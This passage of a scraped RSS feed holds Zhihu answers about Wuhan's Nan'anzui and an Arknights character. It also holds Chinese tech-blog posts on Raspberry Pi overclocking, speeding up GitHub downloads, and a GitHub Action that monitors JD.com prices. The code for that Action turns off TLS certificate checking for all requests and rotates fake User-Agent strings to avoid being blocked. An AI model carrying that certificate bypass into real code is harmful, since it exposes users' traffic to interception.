data-private-watermark-src=\"v2-dd128e8805688e6b78c6c2c5d8bf2766\"></p>\n<p><br></p>\n<p>最近一次去南岸嘴是下午四点，<b>在晴川桥下发现三张蒙着布的台球桌</b>，积满灰。一个中年男人从一间孤零零的办公室伸出脑袋，递来球竿，“自己玩，不要钱，桌上有巧克。” 他说从前十元一盘，老板不做了，而后转动钥匙，跨着电动车扬长而去。</p>\n<p><br></p>\n<hr>\n<p><br></p>\n<p><b>  插播一则课外知识</b></p>\n<p><br></p>\n<p><img src=\"https://pic2.zhimg.com/v2-c25788e5dfd391a80204745642305983_720w.jpg?rss\" data-caption=\"●武汉南岸嘴影像对比（左图 1966年 右图 2019年）\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"809\" data-watermark=\"original\" data-original-src=\"v2-c25788e5dfd391a80204745642305983\" data-watermark-src=\"v2-3bd58a509ecf4d3523470aaedea9aba9\" data-private-watermark-src=\"v2-babfbc035f067b5b119e17727da78a04\"></p>\n<p><br></p>\n<p>如今的南岸嘴面积比1998年以前“小”一些。</p>\n<p>1998年以前，汉水几乎是一个直角拐弯，撞向南岸嘴。1998年8月底，整治龙王庙水利工程开工，第一件事就是拆迁南岸嘴，拉直汉江河道。南岸嘴沿江削坡60米，还路于水，从前的直角转弯，变得缓和，水流也变得温顺。</p>\n<p></p>\n<p></p>\n<p></p>\n<p></p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/hansyi-sheng-78?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">HANS汉声</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/451982188/answer/1970788130?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">10 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/395157045?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">武汉全员检测完成后会不会成为全国最安全的城市？</a><br><a href=\"http://www.zhihu.com/question/352383201?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">第一次到武汉，武汉是个怎样的城市呢？</a><br>\n","link":"http://www.zhihu.com/question/451982188/answer/1970788130?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"如何评价《明日方舟》新六星卡涅利安？","date":"2021-07-01 15:30:08","description":"\n<p>粗略地做了个卡涅利安的评测视频。她的定位是环法，常态高防，不开技能可以用作嘲讽吸引伤害，开技能时也有极高的DPS，清场秒人两不误。而且谁能拒绝埃及风小姐姐呢（</p>\n<hr>\n<p>第二个评测视频出来了，6人H7-4卡姐伤害测试，有兴趣可以移步观看</p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/virunce?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">Yuro</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/461539120/answer/1920212609?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">67 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/470024039?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">明日方舟需要弃游反抗还是批评?</a><br><a href=\"http://www.zhihu.com/question/469940341?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">如何看待明日方舟的一键领取功能？</a><br>\n","link":"http://www.zhihu.com/question/461539120/answer/1920212609?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"树莓派超频","date":"2021-06-25 15:50:00","description":"\n<div class=\"note note-info\">            <p>本文操作系统为 Ubuntu Server 20.04，其他操作系统可能有所不同。</p>          </div>\n<div class=\"note note-warning\">            <p>超频是有风险的，温度也会更高，需要比较良好的散热。</p>          </div>\n<h2>\n<a href=\"https://blog.yfun.top/#%E5%BC%80%E5%A7%8B\" class=\"headerlink\" title=\"开始\"></a>开始</h2>\n<p>登录树莓派，进入 <code>/boot/firmware/</code> 目录：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">cd</span> /boot/firmware/</span><br></pre></td></tr></table></figure><div class=\"note note-warning\">            <p>网上很多教程让你修改 <code>config.txt</code> 文件，但注释里已经很明确的写了：</p>\n<figure class=\"highlight text\"><table><tr><td class=\"code\"><pre><span class=\"line\"># Please DO NOT modify this file; if you need to modify the boot config, the</span><br><span class=\"line\"># \"usercfg.txt\" file is the place to include user changes. Please refer to</span><br><span class=\"line\"># the README file for a description of the various configuration files on</span><br><span class=\"line\"># the boot partition.</span><br></pre></td></tr></table></figure>\n</div>\n<p>我们修改 <code>usercfg.txt</code> 文件：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">sudo vim usercfg.txt</span><br></pre></td></tr></table></figure><p>在文件末尾追加配置信息，以下是我的，仅供参考：</p>\n<div class=\"note note-danger\">            <p>我使用的是 <code>Raspberry Pi 4 (4GB)</code>，并且有小风扇和散热片。<br>请根据自己的需要和配置进行更改。</p>          </div>\n<figure class=\"highlight text\"><table><tr><td class=\"code\"><pre><span class=\"line\">force_turbo=0</span><br><span class=\"line\">arm_freq=1850</span><br><span class=\"line\">over_voltage=6</span><br><span class=\"line\">gpu_freq=650</span><br><span class=\"line\">core_freq=650</span><br><span class=\"line\">gpu_mem=620</span><br></pre></td></tr></table></figure><h2>\n<a href=\"https://blog.yfun.top/#%E9%87%8D%E5%90%AF\" class=\"headerlink\" title=\"重启\"></a>重启</h2>\n<p>保存文件，使用命令重启：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">sudo reboot</span><br></pre></td></tr></table></figure><h2>\n<a href=\"https://blog.yfun.top/#%E5%90%8E\" class=\"headerlink\" title=\"后\"></a>后</h2>\n<p>重启完毕后，再使用 <code>lscpu</code> 命令看看 CPU 状况。</p>\n","link":"https://blog.yfun.top/posts/1445549919/"},{"title":"订阅 YFun's Blog","date":"2021-06-20 10:30:00","description":"\n<p>自 2021 年 6 月 20 日起，本博客将同步更新 Twitter 和 Telegram 频道(由 IFTTT 提供支持)。</p>\n<ul>\n<li><a href=\"https://t.me/s/always_explore\">Telegram Channel</a></li>\n<li><a href=\"https://twitter.com/OhhhCKY\">Twitter</a></li>\n</ul>\n","link":"https://blog.yfun.top/posts/3249015232/"},{"title":"加速 GitHub 下载","date":"2021-06-18 17:30:00","description":"\n<p>GitHub 在国内的访问情况不太稳定，仓库克隆速度也非常慢。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E2%9C%88%EF%B8%8F\" class=\"headerlink\" title=\"✈️\"></a>✈️</h2>\n<p>不必多说。</p>\n<p>例如 <a href=\"http://127.0.0.1:7890/\">http://127.0.0.1:7890</a> 为代理地址，你可以使用下方的命令更改：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">git config --global http.proxy http://127.0.0.1:7890</span><br></pre></td></tr></table></figure><p>如果有一天不需要了，输入下面代码取消：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">git config --global --<span class=\"built_in\">unset</span> http.proxy</span><br></pre></td></tr></table></figure><h2>\n<a href=\"https://blog.yfun.top/#FastGit\" class=\"headerlink\" title=\"FastGit\"></a>FastGit</h2>\n<p>使用 <a href=\"https://fastgit.org/\">FastGit</a> 提供的 GitHub 镜像。</p>\n<p>镜像地址：<a href=\"https://hub.fastgit.org/\">https://hub.fastgit.org</a></p>\n<p>支持 HTTPS 克隆，并且提供 raw.githubusercontent.com 的镜像，地址为 <a href=\"https://raw.fastgit.org/\">https://raw.fastgit.org</a></p>\n<h2>\n<a href=\"https://blog.yfun.top/#CNPM\" class=\"headerlink\" title=\"CNPM\"></a>CNPM</h2>\n<p>使用 <a href=\"https://cnpmjs.org/\">CNPM</a> 提供的 GitHub 镜像。</p>\n<p>镜像地址：<a href=\"https://github.com.cnpmjs.org/\">https://github.com.cnpmjs.org</a></p>\n<p>支持 HTTPS 克隆。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#Hosts\" class=\"headerlink\" title=\"Hosts\"></a>Hosts</h2>\n<p>通过更改 Hosts 文件的方式解决，但大有可能失效：</p>\n<figure class=\"highlight text\"><table><tr><td class=\"code\"><pre><span class=\"line\">199.232.69.194  github.global.ssl.fastly.net</span><br><span class=\"line\">140.82.113.4    github.com</span><br></pre></td></tr></table></figure><p>GitHub 上的 <a href=\"https://github.com/521xueweihan/GitHub520\">521xueweihan/GitHub520</a> 项目提供了更多关于 GitHub Hosts 列表。</p>\n<blockquote><p><a href=\"https://github.com/521xueweihan/GitHub520/issues/53\">521xueweihan/GitHub520 #53</a></p></blockquote>\n<h2>\n<a href=\"https://blog.yfun.top/#Gitee\" class=\"headerlink\" title=\"Gitee\"></a>Gitee</h2>\n<p>网上挺多教程，使用 Gitee 的「从 GitHub 导入」功能。</p>\n<p>不过 Gitee 限制仓库 500MB。。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#Coding\" class=\"headerlink\" title=\"Coding\"></a>Coding</h2>\n<p>进入 Coding 控制台，点击「创建项目」。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.9/rawimg/k7uHJm.png\"></p>\n<p>项目模版选择「代码托管」就好，仅做下载的话无需开启太多。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.9/rawimg/bEO0vX.png\"></p>\n<p>填写项目基本信息，如名称、标识等。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.9/rawimg/N4xjSv.png\"></p>\n<p>新建一个镜像仓库。</p>\n<p>「Git 仓库 URL」填写 GitHub 公开仓库 HTTPS 克隆地址，如：<a href=\"https://github.com/twbs/bootstrap.git\">https://github.com/twbs/bootstrap.git</a></p>\n<p>创建完成后请稍等，系统就会自动导入。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.9/rawimg/YxnnDj.png\"></p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.9/rawimg/FmfWkf.png\"></p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.9/rawimg/OV7w4v.png\"></p>\n<p>导入完成后，点击「克隆」就能找到克隆地址。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.9/rawimg/bWszbu.png\"></p>\n<p>克隆速度挺快的：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">Cloning into <span class=\"string\">'bootstrap'</span>...</span><br><span class=\"line\">remote: Enumerating objects: 169214, <span class=\"keyword\">done</span>.</span><br><span class=\"line\">remote: Counting objects: 100% (169214/169214), <span class=\"keyword\">done</span>.</span><br><span class=\"line\">remote: Compressing objects: 100% (51634/51634), <span class=\"keyword\">done</span>.</span><br><span class=\"line\">Receiving objects:  57% (96728/169214), 90.58 MiB | 6.83 MiB/s </span><br></pre></td></tr></table></figure><p>此外，Coding 还支持自动同步，可以设置每天的同步时间。</p>\n","link":"https://blog.yfun.top/posts/2517388641/"},{"title":"GitHub Action 监测京东商品价格","date":"2021-05-18 18:32:00","description":"\n<h2>\n<a href=\"https://blog.yfun.top/#%E5%89%8D%E8%A8%80\" class=\"headerlink\" title=\"前言\"></a>前言</h2>\n<p>我会在京东上买些电子产品和文具，那么如何获得商品降价信息，使用更低的价格购买呢？</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E5%BC%80%E5%A7%8B\" class=\"headerlink\" title=\"开始\"></a>开始</h2>\n<p>新建一个 <code>GitHub</code> 仓库，创建 <code>main.py</code> , <code>notify.py</code> 和 <code>.github/workflows/auto.yml</code> 三个文件，内容如下：</p>  <details class=\"post-details\"><summary><code>main.py</code> (点击展开)</summary><div class=\"details-content\">  <figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># -*- coding: utf-8 -*-</span></span><br><span class=\"line\"><span class=\"comment\"># 导入模块</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> urllib.request, random, json, notify</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 商品列表</span></span><br><span class=\"line\">check = [</span><br><span class=\"line\">    <span class=\"comment\"># 闪迪（SanDisk）64GB TF（MicroSD）存储卡</span></span><br><span class=\"line\">    <span class=\"string\">'1887526'</span>,</span><br><span class=\"line\">    <span class=\"comment\"># 晨光(M&amp;G)文具 0.5mm 黑色中性笔</span></span><br><span class=\"line\">    <span class=\"string\">'277393'</span></span><br><span class=\"line\"><span class=\"comment\"># ...</span></span><br><span class=\"line\">]</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 价格列表，用于临时存储获取到的价格数据</span></span><br><span class=\"line\">price = {}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 读取上次的价格文件</span></span><br><span class=\"line\"><span class=\"keyword\">try</span>:</span><br><span class=\"line\">    file = <span class=\"built_in\">open</span>(<span class=\"string\">'./price.json'</span>, mode=<span class=\"string\">'r'</span>)</span><br><span class=\"line\">    lastPrice = json.loads(file.readlines()[<span class=\"number\">0</span>])</span><br><span class=\"line\"><span class=\"keyword\">except</span>:</span><br><span class=\"line\">    print(<span class=\"string\">\"读取文件时出现错误！\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 遍历列表，比对价格</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> itemId <span class=\"keyword\">in</span> check:</span><br><span class=\"line\">    <span class=\"comment\"># 组合请求 URL</span></span><br><span class=\"line\">    <span class=\"comment\"># http://p.3.cn/prices/mgets?skuIds=J_</span></span><br><span class=\"line\">    url = <span class=\"string\">'http://p.3.cn/prices/mgets?skuIds=J_{}'</span>.<span class=\"built_in\">format</span>(itemId)</span><br><span class=\"line\">    <span class=\"comment\"># User-Agent 列表</span></span><br><span class=\"line\">    ua = [<span class=\"string\">'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36'</span>,<span class=\"string\">'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36'</span>,<span class=\"string\">'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36 OPR/26.0.1656.60'</span>,<span class=\"string\">'Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50'</span>,<span class=\"string\">'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50'</span>]</span><br><span class=\"line\">    <span class=\"comment\"># 随机获得一个 User-Agent，如不带 User-Agent 请求，就会被拒绝。</span></span><br><span class=\"line\">    headers = {</span><br><span class=\"line\">        <span class=\"string\">'User-Agent'</span>: ua[random.randint(<span class=\"number\">0</span>,<span class=\"number\">4</span>)]</span><br><span class=\"line\">    }</span><br><span class=\"line\">    <span class=\"comment\"># 组合请求参数</span></span><br><span class=\"line\">    request = urllib.request.Request(url = url, headers = headers)</span><br><span class=\"line\">    <span class=\"comment\"># 向京东发起请求</span></span><br><span class=\"line\">    response = urllib.request.urlopen(request)</span><br><span class=\"line\">    <span class=\"comment\"># 将获得的数据转为 JSON</span></span><br><span class=\"line\">    page_text = json.loads(response.read().decode(<span class=\"string\">'utf-8'</span>))</span><br><span class=\"line\">    thisPrice = <span class=\"built_in\">float</span>(page_text[<span class=\"number\">0</span>][<span class=\"string\">'p'</span>])</span><br><span class=\"line\">    <span class=\"comment\"># 将价格输入至价格变量</span></span><br><span class=\"line\">    price[itemId] = thisPrice</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># 尝试对比价格</span></span><br><span class=\"line\">    <span class=\"keyword\">try</span>:</span><br><span class=\"line\">        <span class=\"keyword\">if</span> thisPrice &gt; lastPrice[itemId]:</span><br><span class=\"line\">            print(<span class=\"string\">\"{0} 涨价\"</span>.<span class=\"built_in\">format</span>(itemId))</span><br><span class=\"line\"></span><br><span class=\"line\">            print(thisPrice - lastPrice[itemId])</span><br><span class=\"line\">            notify.notify(itemId, <span class=\"number\">0</span>, thisPrice - lastPrice[itemId], thisPrice)</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">elif</span> thisPrice &lt; lastPrice[itemId]:</span><br><span class=\"line\">            print(<span class=\"string\">\"{0} 降价\"</span>.<span class=\"built_in\">format</span>(itemId))</span><br><span class=\"line\">            print(lastPrice[itemId] - thisPrice)</span><br><span class=\"line\">            notify.notify(itemId, <span class=\"number\">2</span>, lastPrice[itemId] - thisPrice, thisPrice)</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">elif</span> lastPrice[itemId] == thisPrice:</span><br><span class=\"line\">            print(<span class=\"string\">\"{0} 价格不变\"</span>.<span class=\"built_in\">format</span>(itemId))</span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            print(<span class=\"string\">\"{0} 未知错误\"</span>.<span class=\"built_in\">format</span>(itemId))</span><br><span class=\"line\">    <span class=\"keyword\">except</span>:</span><br><span class=\"line\">        print(<span class=\"string\">\"无法进行比对\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 将 JSON 转为 字符串</span></span><br><span class=\"line\">priceStr = json.dumps(price)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 写入价格文件，便于下次查询</span></span><br><span class=\"line\"><span class=\"keyword\">try</span>:</span><br><span class=\"line\">    file = <span class=\"built_in\">open</span>(<span class=\"string\">'./price.json'</span>, mode = <span class=\"string\">'w'</span>)</span><br><span class=\"line\">    file.write(priceStr)</span><br><span class=\"line\">    file.close()</span><br><span class=\"line\"><span class=\"keyword\">except</span>:</span><br><span class=\"line\">    print(<span class=\"string\">\"写入文件时出现错误\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">print(price)</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n</div></details><details class=\"post-details\"><summary><code>notify.py</code> (点击展开)</summary><div class=\"details-content\">  <figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># -*- coding: utf-8 -*-</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> urllib.request, json, urllib.parse, ssl</span><br><span class=\"line\">ssl._create_default_https_context = ssl._create_unverified_context</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"string\">'''</span></span><br><span class=\"line\"><span class=\"string\">提醒的服务，支持 `wechat` 与 `qmsg`。</span></span><br><span class=\"line\"><span class=\"string\">需要在下方进行下一步的配置</span></span><br><span class=\"line\"><span class=\"string\">'''</span></span><br><span class=\"line\">server = [<span class=\"string\">'qmsg'</span>]</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"string\">'''</span></span><br><span class=\"line\"><span class=\"string\">WeChat 采用的是 Server 酱 (https://sc.ftqq.com/3.version) 提供的服务</span></span><br><span class=\"line\"><span class=\"string\">key：Server 酱提供的 Token，必填。</span></span><br><span class=\"line\"><span class=\"string\">'''</span></span><br><span class=\"line\">wechat = {</span><br><span class=\"line\">    <span class=\"string\">\"key\"</span>: <span class=\"string\">\"\"</span></span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"string\">'''</span></span><br><span class=\"line\"><span class=\"string\">Qmsg 采用的是 Qmsg 酱 (https://qmsg.zendee.cn/) 提供的服务</span></span><br><span class=\"line\"><span class=\"string\">key：Qmsg 酱提供的 KEY，必填。</span></span><br><span class=\"line\"><span class=\"string\">qid：接收消息的 QQ 号（不支持 QQ 群），可以添加多个，以半角逗号分割，如：`10001,10002`（必须均在您的 Qmsg 酱 QQ 号列表中）。</span></span><br><span class=\"line\"><span class=\"string\">'''</span></span><br><span class=\"line\">qmsg = {</span><br><span class=\"line\">    <span class=\"string\">\"key\"</span>: <span class=\"string\">\"\"</span>,</span><br><span class=\"line\">    <span class=\"string\">\"qid\"</span>: <span class=\"string\">\"\"</span></span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">wechat_send</span>(<span class=\"params\">key, title, text</span>):</span></span><br><span class=\"line\">    url = <span class=\"string\">'http://sc.ftqq.com/{0}.send?text={1}&amp;desp={2}'</span>.<span class=\"built_in\">format</span>(key, urllib.parse.quote(title), urllib.parse.quote(text))</span><br><span class=\"line\">    headers = {</span><br><span class=\"line\">        <span class=\"string\">'User-Agent'</span>: <span class=\"string\">\"Check Price Bot\"</span></span><br><span class=\"line\">    }</span><br><span class=\"line\">    request = urllib.request.Request(url=url, headers=headers)</span><br><span class=\"line\">    response = urllib.request.urlopen(request)</span><br><span class=\"line\">    page_text = json.loads(response.read().decode(<span class=\"string\">'utf-8'</span>))</span><br><span class=\"line\">    <span class=\"keyword\">if</span> page_text[<span class=\"string\">'errno'</span>] == <span class=\"number\">0</span>:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">True</span></span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">False</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">qmsg_send</span>(<span class=\"params\">key, <span class=\"built_in\">id</span>, text</span>):</span></span><br><span class=\"line\">    url = <span class=\"string\">'http://qmsg.zendee.cn/send/{0}?msg={1}&amp;qq={2}'</span>.<span class=\"built_in\">format</span>(key, urllib.parse.quote(text), <span class=\"built_in\">id</span>)</span><br><span class=\"line\">    headers = {</span><br><span class=\"line\">        <span class=\"string\">'User-Agent'</span>: <span class=\"string\">\"Check Price Bot\"</span></span><br><span class=\"line\">    }</span><br><span class=\"line\">    request = urllib.request.Request(url=url, headers=headers)</span><br><span class=\"line\">    response = urllib.request.urlopen(request)</span><br><span class=\"line\">    page_text = json.loads(response.read().decode(<span class=\"string\">'utf-8'</span>))</span><br><span class=\"line\">    <span class=\"keyword\">if</span> page_text[<span class=\"string\">'code'</span>] == <span class=\"number\">0</span>:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">True</span></span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">False</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">notify</span>(<span class=\"params\"><span class=\"built_in\">id</span>,<span class=\"built_in\">type</span>,price,nowPrice</span>):</span></span><br><span class=\"line\">    <span class=\"string\">'''</span></span><br><span class=\"line\"><span class=\"string\">    type:</span></span><br><span class=\"line\"><span class=\"string\">        0: 涨价</span></span><br><span class=\"line\"><span class=\"string\">        1: 无变化</span></span><br><span class=\"line\"><span class=\"string\">        2: 降价</span></span><br><span class=\"line\"><span class=\"string\">    id: 商品 ID</span></span><br><span class=\"line\"><span class=\"string\">    price: 差价</span></span><br><span class=\"line\"><span class=\"string\">    nowPrice: 现价</span></span><br><span class=\"line\"><span class=\"string\">    '''</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">for</span> svId <span class=\"keyword\">in</span> server:</span><br><span class=\"line\">        <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">send</span>(<span class=\"params\">title,content</span>):</span></span><br><span class=\"line\">            <span class=\"keyword\">if</span> svId == <span class=\"string\">'wechat'</span>:</span><br><span class=\"line\">                wechat_send(wechat[<span class=\"string\">\"key\"</span>],title,content)</span><br><span class=\"line\">            <span class=\"keyword\">if</span> svId == <span class=\"string\">'qmsg'</span>:</span><br><span class=\"line\">                qmsg_send(qmsg[<span class=\"string\">\"key\"</span>],qmsg[<span class=\"string\">\"qid\"</span>],title + <span class=\"string\">\"\\n\"</span> + content)</span><br><span class=\"line\">            <span class=\"keyword\">else</span>:</span><br><span class=\"line\">                <span class=\"keyword\">return</span> <span class=\"literal\">False</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> <span class=\"built_in\">type</span> == <span class=\"number\">0</span>:</span><br><span class=\"line\">            title = <span class=\"string\">\"商品 {0} 涨价!\"</span>.<span class=\"built_in\">format</span>(<span class=\"built_in\">id</span>)</span><br><span class=\"line\">            content = <span class=\"string\">\"您关注的商品 {0} 涨价咯！价格相较于上次监测，高了 {1} 元，现价 {2} 元。商品详情：https://item.jd.com/{0}.html\"</span>.<span class=\"built_in\">format</span>(<span class=\"built_in\">id</span>,price,nowPrice)</span><br><span class=\"line\">            send(title,content)</span><br><span class=\"line\">        <span class=\"keyword\">elif</span> <span class=\"built_in\">type</span> == <span class=\"number\">1</span>:</span><br><span class=\"line\">            print(<span class=\"string\">\"价格没有变化，不推送通知。\"</span>)</span><br><span class=\"line\">        <span class=\"keyword\">elif</span> <span class=\"built_in\">type</span> == <span class=\"number\">2</span>:</span><br><span class=\"line\">            title = <span class=\"string\">\"商品 {0} 降价!\"</span>.<span class=\"built_in\">format</span>(<span class=\"built_in\">id</span>)</span><br><span class=\"line\">            content = <span class=\"string\">\"您关注的商品 {0} 降价咯！价格相较于上次监测，低了 {1} 元，现价 {2} 元。商品详情：https://item.jd.com/{0}.html\"</span>.<span class=\"built_in\">format</span>(<span class=\"built_in\">id</span>, price,nowPrice)</span><br><span class=\"line\">            send(title, content)</span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"literal\">False</span></span><br></pre></td></tr></table></figure>\n</div></details><details class=\"post-details\"><summary><code>.github/workflows/auto.yml</code> (点击展开)</summary><div class=\"details-content\">  <figure class=\"highlight yaml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"attr\">name:</span> <span class=\"string\">Check</span> <span class=\"string\">Price</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"attr\">on:</span></span><br><span class=\"line\">  <span class=\"attr\">push:</span></span><br><span class=\"line\">    <span class=\"attr\">branches:</span> </span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"string\">master</span></span><br><span class=\"line\">  <span class=\"attr\">schedule:</span></span><br><span class=\"line\">    <span class=\"comment\"># 每 1 小时运行一次</span></span><br><span class=\"line\">    <span class=\"bullet\">-</span> <span class=\"attr\">cron:</span> <span class=\"string\">\"0 * * * *\"</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"attr\">jobs:</span></span><br><span class=\"line\">  <span class=\"attr\">check:</span></span><br><span class=\"line\">    <span class=\"attr\">runs-on:</span> <span class=\"string\">ubuntu-latest</span></span><br><span class=\"line\">    <span class=\"attr\">steps:</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Clone</span> <span class=\"string\">repository</span></span><br><span class=\"line\">        <span class=\"attr\">uses:</span> <span class=\"string\">actions/checkout@v2</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">'Set up Python'</span></span><br><span class=\"line\">        <span class=\"attr\">uses:</span> <span class=\"string\">actions/setup-python@v2</span></span><br><span class=\"line\">        <span class=\"attr\">with:</span></span><br><span class=\"line\">          <span class=\"attr\">python-version:</span> <span class=\"number\">3.7</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Run</span></span><br><span class=\"line\">        <span class=\"attr\">run:</span> <span class=\"string\">|</span></span><br><span class=\"line\">          <span class=\"string\">python</span> <span class=\"string\">main.py</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Push</span></span><br><span class=\"line\">        <span class=\"attr\">run:</span> <span class=\"string\">|</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">config</span> <span class=\"string\">--local</span> <span class=\"string\">user.email</span> <span class=\"string\">\"icolabot@e.yfun.top\"</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">config</span> <span class=\"string\">--local</span> <span class=\"string\">user.name</span> <span class=\"string\">\"iColaBot\"</span></span><br><span class=\"line\">          <span class=\"string\">date</span> <span class=\"string\">+\"%Y-%m-%d</span> <span class=\"string\">%H:%M:%S.%N\"</span> <span class=\"string\">&gt;</span> <span class=\"string\">date.txt</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">add</span> <span class=\"string\">-A</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">commit</span> <span 